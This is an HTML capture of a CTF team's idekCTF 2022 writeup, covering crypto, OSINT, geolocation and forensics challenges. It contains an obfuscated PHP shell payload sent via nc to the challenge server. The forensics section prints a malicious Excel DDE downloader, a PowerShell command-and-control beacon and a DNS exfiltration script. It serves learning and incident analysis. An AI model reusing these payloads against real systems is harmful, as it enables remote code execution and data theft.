'('^'.'^'^'^\"0\" \"m\": ']'^\"0\" \"sYstEm\": (\"s\").(\"Y\").(\"s\").(\"t\").(\"E\").(\"m\") \"sh\": (\"s\").(\"h\") Get shell: (\"sYstEm\")(\"sh\") # Payload Length: 521 (echo \"(('['^'(').('['^','^'.').('['^'(').(')'^']').('['^'.'^((('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',')^(('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',')).'').(']'^((('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',')^(('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',')).''))(('['^'(').('('^'.'^'^'^((('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',')^(('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',')).''))\" \u0026\u0026 cat) | nc phpfun.chal.idek.team 1337 Input script: bash # switch to bash shell if needed $ cat /flag.txt idek{N3w_v3rs1on_r3qu1re_new_t00lz!} Extras:\nWe only have half of the standard ascii characters available. How about a short payload to create the remaining characters?\n(This is equivalent to creating just 1 more character not currently available)\n\"q\": ','^']' \"6\": '('^'.'^\"0\" \"4\": '('^','^\"0\" \"sqrt\": (\"s\").(\"q\").(\"r\").(\"t\") \"64\": (\"6\").(\"4\") 8: (\"sqrt\")(\"64\") \"8\": (8).'' Post-mortem: There is a shorter payload for 0, which is illustrated by the following:\n# original, length: 139 0: false^false (('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',')^(('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',') # replacement, length: 112 # notice that this is a float 0 instead of an integer 0 0: (\"sqrt\")(false) (('['^'(').(','^']').(','^'^').(')'^']'))((('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',',')) # Shortened Shell Payload - Length: 440 (('['^'(').('['^','^'.').('['^'(').(')'^']').('['^'.'^((('['^'(').(','^']').(','^'^').(')'^']'))((('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',','))).'').(']'^((('['^'(').(','^']').(','^'^').(')'^']'))((('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',','))).''))(('['^'(').('('^'.'^'^'^((('['^'(').(','^']').(','^'^').(')'^']'))((('['^'(').(')'^']').(','^'^').('['^'(').(')'^']').(','^'^'))('',','))).''))   By these, we can generate all available characters.\nOsint Osint Crime Confusion Series Solved by fsharp, Hollow, J4cky, LifeIsHard, RaccoonNinja, TWY\n1: W as in Where (74 solves) We found Dr. Jonathan Abigdail III in IG (a clue is that Abigdail is very uncommon name) We check the post and found another user - Heather James from hashtag We know some information about Heather James\n study and Teached blue birds at the University of Dutch ThE of Topics in Science (UThE_TS) great_paintball_portugal competition ebay\n We found a user named great_paintball_portugal in ebay and a url: https://franparrefrancisco.wixsite.com/great-paintball-pt Then, we check the post at https://franparrefrancisco.wixsite.com/great-paintball-pt/blog Flag: idek{TGPP_WCIYD}\n2: W as in Weapon (50 solves) It has something to do with a university of science. We checked the university’s twitter (blue bird) and found this Then, we visit https://pads.ccc.de/ep/pad/view/ro.lvGC01KAJWI/rev.354  We do have a theory to what killed because something has been missing ( HUBBLE SPACE TELESCOPE MODEL, BY PENWAL INDUSTRIES FOR NASA, CA 1990) ah shit delete delete\n Flag: idek{HSTM_X!#$}\n3: W as in Who (76 solves) First, I found a name Alfaiate D’interiores from the attached picture After google the name, you can see the store’s comments Found the email address: noodlesareramhackers@gmail.com\nI send an email and here is the reply.\n So… I got some stuff to tell you. I think the killer is probably watching us. The killer used a weird weapon as you have found out. Look, the info I have is that weirdly enough the university page of Heather tweeted something that might lead you to the killer. They deleted it though. Luckily these days you can just walk back in time! Ah, the tweet was 1612383535549059076. When you have the info look in github! Good Luck!\n So, check the deleted tweet at https://web.archive.org/web/20230109094239/https://twitter.com/UThE_TS/status/1612383535549059076/\n Remember that weird student that wrote about potatoes eating camels? AHAHAH Maybe she is the killer\n We have some info now, so take a look at github and found the flag https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki Flag: idek{JULIANA_APOSIDM723489}\n4: W as in Why (74 solves) Use the keywords Johan Jørgen and sommerleker to google search. Then i find this.\nIt is the same as the picture attached. So,the flag is idek{OLM-08741}\nNMPZ (54 solves) Solved by most members of the team collaborating; write-up by RaccoonNinja\nUsual clues in Geolocation:\n Landmarks (confirmed by image search or otherwise)     # Letter Country Reason     1 B Brazil Mureta da Urca   2 R Russia Kremlin+Saint Basil’s Cathedral   6 _ Iceland Ring Road crossref   9 _ Monaco Monaco Cruise Port     Legible text and less legible text     # Letter Country Reason     3 e estonia Kalamaja   5 K Kenya “Peri Peri Pizza”, “Third Street”   12 a Austria “Elektro weißensteiser”, “Nikolaus-Dumba-Straße”   14 ??? Certain Spanish country “Vía” means road in Spanish   15 b Bulgaria “за…” ИМД (actually КМД), Google image search     Other characteristics (often need cross-check)     # Letter Country Reason     4 A Australia General outback   7 m Mongolia Yurt (cross-checked by image search)   10 s Switzerland Flag (from a problem-setting perspective), overall household style and road mirror   11 P Poland Road pole (google image search)    Now it is a guessing game, but there are plenty of ways to narrow the search.\n There are only = 1mil, all other countries are word boundaries Always look at the flag BRe*K_m*_sPa**B**.  4 is most likely A/a, with the general outback feel and the road characteristics = Australia 8 is e/E/Y but Yemen is unlikely = e/E, this is the only character I guessed at submission (post solve: it’s Eswatini) 13 is America or Canada from image search (road characteristics) but sPaA doesn’t make sense 16, 17 are image-searched as albania and Russia respectively, but they just confirm my guess of sPaCEbaR, with Ecuador fitting 14.   Geohints can be useful but I didn’t use it. The discord channel discussion has lots of useful info (after the CTF) as well  ",
+  "wordCount" : "5095",
+  "inLanguage": "en",
+  "datePublished": "2023-02-03T18:05:00+08:00",
+  "dateModified": "2023-02-03T18:05:00+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "botton"
+  }, {
+    "@type": "Person",
+    "name": "cire meat pop"
+  }, {
+    "@type": "Person",
+    "name": "fsharp"
+  }, {
+    "@type": "Person",
+    "name": "harrier"
+  }, {
+    "@type": "Person",
+    "name": "Hollow"
+  }, {
+    "@type": "Person",
+    "name": "J4cky"
+  }, {
+    "@type": "Person",
+    "name": "Kaiziron"
+  }, {
+    "@type": "Person",
+    "name": "LifeIsHard"
+  }, {
+    "@type": "Person",
+    "name": "Mystiz"
+  }, {
+    "@type": "Person",
+    "name": "ozetta"
+  }, {
+    "@type": "Person",
+    "name": "RaccoonNinja"
+  }, {
+    "@type": "Person",
+    "name": "TWY"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://b6a.black/posts/2023-01-30-idekctf/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Black Bauhinia",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://b6a.black/favicon.ico"
+    }
+  }
+}
+</script>
+
+
+
+</head>
+
+<body class=" dark" id="top">
+<noscript>
+    <style type="text/css">
+        .theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
+            <span class="logo-switches">
+                
+                
+            </span>
+        </div>
+        <ul id="menu" onscroll="menu_on_scroll()">
+            <li>
+                <a href="https://b6a.black/about-us/" title="About Us">
+                    <span>About Us</span>
+                </a>
+            </li></ul>
+    </nav>
+</header>
+
+    <main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+
+    <h1 class="post-title">
+      idekCTF 2022* Writeup
+    </h1>
+    <div class="post-meta">
+
+February 3, 2023&nbsp;·&nbsp;botton, cire meat pop, fsharp, harrier, Hollow, J4cky, Kaiziron, LifeIsHard, Mystiz, ozetta, RaccoonNinja, TWY
+
+</div>
+  </header>
+  
+  
+  <div class="post-content js-toc-content">
+<h2 id="crypto">Crypto<a hidden class="anchor" aria-hidden="true" href="#crypto">#</a></h2>
+<div class="alert info">
+  Writeup for some other crypto challenges will be ready later.
+</div>
+  
+<h3 id="finite-realm-of-random-4-solves">Finite Realm of Random (4 solves)<a hidden class="anchor" aria-hidden="true" href="#finite-realm-of-random-4-solves">#</a></h3>
+<p><em>Solved by <a href="https://grhkm21.github.io/posts/idek-finite-realm-of-random/">grhkm</a></em></p>
+<p>Second blood.</p>
+<p>Let $L = \mathbb{F}_{127^{32}}$ and $g$ be a fixed generator of $L$. The flag is splitted into character blocks and the following operation is performed:</p>
+<ol>
+<li>The block is encoded by $\vec{c} = (c_0, c_1, \ldots, c_{31}) \mapsto f = c_0 + c_1g + c_2g^2 + \cdots + c_{31}g^{31}$</li>
+<li>For at most $5$ times:
+<ol>
+<li>Two elements $r_1$ and $r_2$ are chosen with the same minimal polynomial in $L$</li>
+<li>Find a polynomial $\varphi(X) \in \mathbb{F}_{127}[X]$ that satisfies $\mathrm{deg}(\varphi) \leq 31$ and $\varphi(r_1) = f$</li>
+<li>Replace $f \mapsto \varphi(r_2)$</li>
+</ol>
+</li>
+<li>We receive the resulting $f$</li>
+</ol>
+<p>Let&rsquo;s first analyse the curious code in 2.1 by recalling the following fact.</p>
+<div class="alert success">
+  <p><strong>Lemma:</strong> Let $L / K$ be a Galois extension. Then, the minimal polynomial of any $\alpha \in L \setminus K$ is</p>
+<p>$$f(x) = \prod_{\sigma \in \mathrm{Gal}(L / K)} (x - \sigma(\alpha)).$$</p>
+
+</div>
+  
+<p>In other words, the roots to the minimal polynomial of $\alpha$ are precisely the Galois conjugates of $\alpha$. Applying this to our problem, we see that $r_2 = \sigma(r_1)$ for some $\sigma \in \mathrm{Gal}(L / K)$. Moreover, recall that the Galois group of a finite field is exactly the powers of the Froebnius automorphism:</p>
+<p>$$
+\mathrm{Gal}(\mathbb{F}_{p^n} / \mathbb{F}_p) = {\mathrm{Frob}_p^i : 0 \leq i &lt; n} \cong \mathbb{Z} / n\mathbb{Z}
+$$</p>
+<p>Where $\mathrm{Frob}_p$ is the map $x \mapsto x^p$. Hence, $r_1$ and $r_2$ are Galois conjugates and we can write $r_2 = r_1^{p^k}$ for some $0 \leq k &lt; 32$.</p>
+<p>Let&rsquo;s move on to the rest of the algorithm. We now compute a polynomial that maps $r_1 \mapsto f$ and see where $r_2$ maps to. With our new gained knowledge, this part is easy to figure out. In fact, since the field has characteristics $p$, we have the following fact:</p>
+<div class="alert success">
+  <strong>Claim:</strong> We have $\varphi(r_2) = \varphi(r_1)^{p^k}$.
+</div>
+  
+<p><em>Proof:</em> We apply Freshman&rsquo;s Dream. Writing $\varphi(X) = \sum_{i = 0}^{31} d_iX^i$, we have</p>
+<p>$$
+\begin{aligned}
+\varphi(r_1)^{p^k} &amp;= \left(\sum_{i = 0}^{31} d_ir_1^i\right)^{p^k} \\
+&amp;= \sum_{i = 0}^{31} \left(d_ir_1^i\right)^{p^k} &amp;\text{Freshman&rsquo;s dream} \\
+&amp;= \sum_{i = 0}^{31} d_ir_1^{ip^k} \\
+&amp;= \varphi\left(r_1^{p^k}\right) \\
+&amp;= \varphi(r_2)
+\end{aligned}
+$$</p>
+<p>Where the third line uses the fact that $d_i \in \mathbb{F}_{127}$, so $d_i^{p^k} = d_i$.</p>
+<p>We are close to the end now. Since by definition, $\varphi(r_1) = f$, we get that $\varphi(r_2) = f^{p^k}$. In other words, step (2) in the original algorithm simply maps $f$ to one of its conjugates by $f \mapsto f^{p^k}$. Therefore, to recover the original $f$, we simply look at all $32$ conjugates of the resulting $f$ and check if it is valid ASCII with the correct length.</p>
+<p>Solve script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Curiously, random is not random</span>
+L <span style="color:#f92672">=</span> GF(<span style="color:#ae81ff">127</span>)
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+    L <span style="color:#f92672">=</span> L[<span style="color:#e6db74">&#39;x&#39;</span>]<span style="color:#f92672">.</span>irreducible_element(<span style="color:#ae81ff">2</span>, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;random&#39;</span>)<span style="color:#f92672">.</span>splitting_field(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;t</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e"># Parses resulting f</span>
+ct <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(open(<span style="color:#e6db74">&#39;out.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read())
+<span style="color:#66d9ef">assert</span> len(ct) <span style="color:#f92672">%</span> L<span style="color:#f92672">.</span>degree() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
+blocks <span style="color:#f92672">=</span> [L(list(map(int, ct[i:i <span style="color:#f92672">+</span> L<span style="color:#f92672">.</span>degree()]))) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ct), L<span style="color:#f92672">.</span>degree())]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert</span>(poly):
+    <span style="color:#66d9ef">return</span> bytes(map(int, poly<span style="color:#f92672">.</span>polynomial()<span style="color:#f92672">.</span>coefficients()))
+
+<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> blocks:
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
+        <span style="color:#75715e"># Checks conjugates by f -&gt; f^(p^i)</span>
+        r <span style="color:#f92672">=</span> bytes(vector(c<span style="color:#f92672">^</span>(<span style="color:#ae81ff">127</span><span style="color:#f92672">^</span>i)))
+        <span style="color:#66d9ef">if</span> all(<span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;=</span> t <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span> <span style="color:#f92672">or</span> t <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> r):
+            print(r<span style="color:#f92672">.</span>decode())
+</code></pre></div><h2 id="forensics">Forensics<a hidden class="anchor" aria-hidden="true" href="#forensics">#</a></h2>
+<h3 id="hiddengem-mixtape-series">HiddenGem Mixtape Series<a hidden class="anchor" aria-hidden="true" href="#hiddengem-mixtape-series">#</a></h3>
+<p><em>Solved by TWY, Hollow, fsharp</em></p>
+<h4 id="1-initial-access-47-solves">1: Initial Access (47 solves)<a hidden class="anchor" aria-hidden="true" href="#1-initial-access-47-solves">#</a></h4>
+<p>An archive is given. It contains a Hyper-V virtual hard disk from the compromised computer of an employee and another archive which is password-protected. For this part, we are supposed to work with the provided hard disk only.</p>
+<p>The challenge description states that the compromise occurred after an employee opened a document file received via email. When examining the hard disk, we should be on the lookout for a suspicious email or document.</p>
+<p>Using AccessData FTK Imager, we add the virtual hard disk as an evidence item. <code>Partition 1 &gt; KAPE &gt; [root]</code> is the part of the hard disk containing all the relevant data used for the Windows operating system. Navigating to <code>C:\Users\IEUser\Documents</code>, we see an email named <code>Policy Update 2023-01-08T01_37_35+07_00.eml</code>. If we open it in a text editor, we could see that the email body and attached document are base64 encoded. The decoded body reads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">We have just completed the Security Baseline for employees and personal computers due to some information leaks, so it is necessary to update the company&#39;s information security policy.
+In order to ensure the Company&#39;s internal information security, I request you to read and master the content of the policy
+This is a confidential document, so it should be protected
+Password is Privacy4411@2023!!!
+Sent with Proton Mail secure email.
+</code></pre></div><p>The attached document is a 7z archive called <code>Policy.7z</code>. As stated by the email, its password is <code>Privacy4411@2023!!!</code>. Opening it shows a document called <code>Policy.xlsx</code>. Given the circumstances, the email and document found are likely the ones referred to by the challenge description.</p>
+<p>One way of analyzing Microsoft Office documents is to open them as a zip archive. Going into <code>xl\externalLinks\externalLink.xml</code>, there is a suspicious line of XML:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+<span style="color:#f92672">&lt;externalLink</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#34;</span> <span style="color:#a6e22e">xmlns:mc=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/markup-compatibility/2006&#34;</span> <span style="color:#a6e22e">mc:Ignorable=</span><span style="color:#e6db74">&#34;x14&#34;</span> <span style="color:#a6e22e">xmlns:x14=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main&#34;</span><span style="color:#f92672">&gt;&lt;ddeLink</span> <span style="color:#a6e22e">xmlns:r=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships&#34;</span> <span style="color:#a6e22e">ddeService=</span><span style="color:#e6db74">&#34;cmd&#34;</span> <span style="color:#a6e22e">ddeTopic=</span><span style="color:#e6db74">&#34;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&amp;quot;http://172.21.20.96/windowsupdate.ps1\&amp;quot;);IEX $e&#34;</span><span style="color:#f92672">&gt;&lt;ddeItems&gt;&lt;ddeItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;_xlbgnm.A1&#34;</span> <span style="color:#a6e22e">advise=</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">/&gt;&lt;ddeItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;StdDocumentName&#34;</span> <span style="color:#a6e22e">ole=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">advise=</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">/&gt;&lt;/ddeItems&gt;&lt;/ddeLink&gt;&lt;/externalLink&gt;</span>
+</code></pre></div><p>Dynamic Data Exchange (DDE) was used to execute malicious code when the document was opened by the employee. The code downloads a PowerShell script from the internet and executes it.</p>
+<p>The hard disk unfortunately does not contain the downloaded script. However, it is still possible to discover what PowerShell code was executed by looking into Windows PowerShell event logs.</p>
+<p>Reading <code>C:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</code> and filtering for event ID 4104, there is one event that contains obfuscated PowerShell code. It is essentially:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">&amp; ( $sHEllid[1]+$sheLLiD[13]+<span style="color:#e6db74">&#39;X&#39;</span>)( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( <span style="color:#66d9ef">[SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]</span>::FRomBase64STRINg( &lt;very long base64 string&gt; ) , <span style="color:#66d9ef">[sySteM.IO.ComprESsiON.cOmpresSiONMODe]</span>::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct  iO.sTReAMrEAder( $_ , <span style="color:#66d9ef">[TExT.EncOdiNg]</span>::AscIi)} | fOREacH-obJeCt{$_.reADToend( )})
+</code></pre></div><p>Deobfuscating it would reveal what commands were being run. The <code>( $sHEllid[1]+$sheLLiD[13]+'X')</code> part evaluates to <code>IEX</code>, which is a shorthand for <code>Invoke-Expression</code> and is responsible for executing code. So, it is important to avoid triggering or including code snippets that evaluate to <code>IEX</code> or <code>Invoke-Expression</code> during deobfuscation.</p>
+<p>To deobfuscate this code, open a PowerShell terminal and execute the part after <code>( $sHEllid[1]+$sheLLiD[13]+'X')</code>. We get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL <span style="color:#e6db74">&#39; &#39;</span>, (&lt;hex followed by base64&gt; |ConvERTtO-SecureSTRiNG -k 55,113,158,254,51,94,175,13,94,42,226,159,63,7,144,195,14,139,39,217,58,39,188,60,182,192,74,94,209,172,100,93)).GetneTwoRKCrEDEnTIAl().pASsWoRD |. ( $PsHoME[21]+$psHOme[34]+<span style="color:#e6db74">&#39;x&#39;</span>)
+</code></pre></div><p>Run the part before <code>|. ( $PsHoME[21]+$psHOme[34]+'x')</code> to get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);$bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);$flag = <span style="color:#66d9ef">[System.Text.Encoding]</span>::ASCII.GetString($bwqvRnHz99);$s=<span style="color:#e6db74">&#39;172.21.20.96:8080&#39;</span>;$i=<span style="color:#e6db74">&#39;eef8efac-321d465e-e9d053a7&#39;</span>;$p=<span style="color:#e6db74">&#39;http://&#39;</span>;$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eef8efac -Headers @{<span style="color:#e6db74">&#34;X-680d-47e8&#34;</span>=$i};<span style="color:#66d9ef">while</span> ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/321d465e -Headers @{<span style="color:#e6db74">&#34;X-680d-47e8&#34;</span>=$i}).Content;<span style="color:#66d9ef">if</span> ($c <span style="color:#f92672">-ne</span> <span style="color:#e6db74">&#39;None&#39;</span>) {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/e9d053a7 -Method POST -Headers @{<span style="color:#e6db74">&#34;X-680d-47e8&#34;</span>=$i} -Body (<span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetBytes($e+$r) -join <span style="color:#e6db74">&#39; &#39;</span>)} sleep 0.8}
+</code></pre></div><p>What the deobfuscated script does are the following:</p>
+<ol>
+<li>A request is sent to <code>http://172.21.20.96:8080/eef8efac</code> with a custom header <code>X-680d-47e8: eef8efac-321d465e-e9d053a7</code>.</li>
+<li>A request is sent to <code>http://172.21.20.96:8080/321d465e</code> with the same custom header. If the received content is not empty, it is executed as PowerShell code, and any error and output is sent to <code>http://172.21.20.96:8080/e9d053a7</code> with the custom header.</li>
+<li>Do nothing for 0.8 seconds.</li>
+<li>Repeat step 2.</li>
+</ol>
+<p><code>172.21.20.96:8080</code> probably acted as a command-and-control (C2) server that tells compromised clients what commands to execute and exfiltrates information from them. Step 1 might have been used to tell the C2 server to begin sending commands to the client.</p>
+<p>There is a suspicious variable named <code>$flag</code> that never gets used in the script. If we evaluate <code>$bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);$bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99);</code> and read the contents of <code>$flag</code>, we get <a href="https://pastebin.com/hVCEUK1B">a Pastebin URL</a> that contains the flag and a webpage link explaining the kind of attack used by the document:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">idek{MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt}
+Resource: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within
+</code></pre></div><h4 id="3-the-ultimate-goal-14-solves">3: The Ultimate Goal (14 solves)<a hidden class="anchor" aria-hidden="true" href="#3-the-ultimate-goal-14-solves">#</a></h4>
+<p>For this part, we need to use the packet capture in the password-protected archive in addition to the hard disk.</p>
+<p>Continuing our investigation, we could find 3 files containing RDP bitmap cache in <code>C:\Users\IEUser\AppData\Local\Microsoft\Terminal Server Client\Cache</code> named <code>Cache0000.bin</code>, <code>Cache0001.bin</code> and <code>Cache0002.bin</code>.</p>
+<p>We could extract the bitmaps from the cache with <a href="https://github.com/ANSSI-FR/bmc-tools"><code>bmc-tools.py</code></a> and piece them back together with <a href="https://github.com/BSI-Bund/RdpCacheStitcher"><code>RdpCacheStitcher</code></a>. By doing so, we discover <a href="https://gist.githubusercontent.com/bquanman/cb6a4b2420d9f3d2f27287dcb46661d6/raw/5c30ba3542b952e2be68491c825f0145ed0da14e/update.ps1">a link to a PowerShell script</a> used for exfiltrating information from compromised computers.</p>
+<p>According to the .ps1 file obtained, we know that we should check the DNS traffic to recover the files leaked.</p>
+<p>Deobfuscated ps1 content with explanations:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1">$d=<span style="color:#e6db74">&#34;172.21.20.96&#34;</span>;
+$s=4;
+$b=57;
+Get-ChildItem <span style="color:#e6db74">&#34;.&#34;</span> | Foreach-Object {
+    $a=<span style="color:#66d9ef">[System.Convert]</span>::ToBase64String($Enc.GetBytes($_.Name));
+    <span style="color:#75715e"># RC4</span>
+    $R={
+        $D,$K=$Args;
+        $S=0..255;0..255|%{
+            $J=($J+$S[$_]+$K[$_%$K.Length])<span style="color:#66d9ef">%</span>256;
+            $S[$_],$S[$J]=$S[$J],$S[$_]
+        };
+        $D|%{
+            $I=($I+1)<span style="color:#66d9ef">%</span>256;
+            $H=($H+$S[$I])<span style="color:#66d9ef">%</span>256;
+            $S[$I],$S[$H]=$S[$H],$S[$I];
+            $_<span style="color:#f92672">-bxor</span>$S[($S[$I]+$S[$H])<span style="color:#66d9ef">%</span>256]
+        }
+    };
+    $Enc = <span style="color:#66d9ef">[System.Text.Encoding]</span>::ASCII;
+    <span style="color:#75715e"># key</span>
+    $p = $Enc.GetBytes(<span style="color:#e6db74">&#39;[System.IO.File]::ReadAllBytes($_.FullName)&#39;</span>);
+    <span style="color:#75715e"># data</span>
+    $z = $Enc.GetBytes(<span style="color:#66d9ef">[System.IO.File]</span>::ReadAllBytes($_.FullName));
+    <span style="color:#75715e"># $u = RC4(data=$z, key=$p)</span>
+    $u = (&amp; $R $z $p);
+    $e = <span style="color:#66d9ef">[System.Convert]</span>::ToBase64String($u);
+    $l=$e.Length;
+
+    <span style="color:#75715e"># separated by . per $b characters</span>
+    $r=<span style="color:#e6db74">&#34;&#34;</span>;
+    $n=0;
+    <span style="color:#75715e"># blocks</span>
+    <span style="color:#66d9ef">while</span> ($n <span style="color:#f92672">-le</span> ($l/$b)) {
+        <span style="color:#75715e"># $c: content length</span>
+        $c=$b;
+        <span style="color:#75715e"># last block check</span>
+        <span style="color:#66d9ef">if</span> (($n*$b)+$c <span style="color:#f92672">-gt</span> $l) {
+            $c=$l-($n*$b)
+        };
+        $r+=$e.Substring($n*$b, $c) + <span style="color:#e6db74">&#34;.&#34;</span>;
+        <span style="color:#75715e"># perform nslookup per $s blocks</span>
+        <span style="color:#66d9ef">if</span> (($n%$s) <span style="color:#f92672">-eq</span> ($s-1)) {
+            nslookup -type=A $r$a. $d;
+            $r=<span style="color:#e6db74">&#34;&#34;</span>
+        }
+        $n=$n+1 
+    }
+    nslookup -type=A $r$a. $d
+}
+</code></pre></div><p>We export the related traffic to JSON (HiddenGem.json) beforehand.</p>
+<p>Wireshark Filter: <code>ip.dst == 172.21.20.96 &amp;&amp; dns.id == 2</code></p>
+<p>Then we can recover all files using the below script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> json<span style="color:#f92672">,</span> base64
+<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
+<span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> makedirs
+data <span style="color:#f92672">=</span> [
+    list(x[<span style="color:#e6db74">&#39;_source&#39;</span>][<span style="color:#e6db74">&#39;layers&#39;</span>][<span style="color:#e6db74">&#39;dns&#39;</span>][<span style="color:#e6db74">&#39;Queries&#39;</span>]<span style="color:#f92672">.</span>values())[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;dns.qry.name&#39;</span>]
+    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> json<span style="color:#f92672">.</span>loads(open(<span style="color:#e6db74">&#34;HiddenGem.json&#34;</span>)<span style="color:#f92672">.</span>read())
+]
+files <span style="color:#f92672">=</span> {}
+<span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> data:
+    <span style="color:#f92672">*</span>content, rfn <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)
+    fn <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(rfn)<span style="color:#f92672">.</span>decode()
+    files[fn] <span style="color:#f92672">=</span> files<span style="color:#f92672">.</span>get(fn, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#f92672">+</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(content)<span style="color:#f92672">.</span>encode())
